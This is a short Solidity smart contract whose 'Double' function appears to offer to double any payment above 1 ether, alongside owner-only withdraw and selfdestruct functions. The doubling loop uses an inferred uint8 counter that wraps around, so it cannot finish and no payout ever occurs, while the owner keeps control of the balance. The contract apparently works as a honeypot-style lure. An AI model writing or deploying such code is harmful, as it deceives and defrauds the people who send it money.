 

pragma solidity ^0.4.26;

contract Testing {
    address owner;
    
    constructor() payable public { 
       owner = msg.sender;
    }
    function withdraw() payable public {
        require(msg.sender==owner);
        owner.transfer(address(this).balance);
    }
    
    function Double() payable public {
        if(msg.value> 1 ether) {
            uint256 multi=0;
            uint256 amountToTransfer=0;
            for(var i=0;i<msg.value*2;i++) {
                multi=i*2;
                if(multi<amountToTransfer) {
                    break;  
                }
                amountToTransfer=multi;
            }    
            msg.sender.transfer(amountToTransfer);
        }
    }
    
    function destroy() public {
        require(msg.sender==owner);
        selfdestruct(msg.sender);
    }

    function() payable external {}
}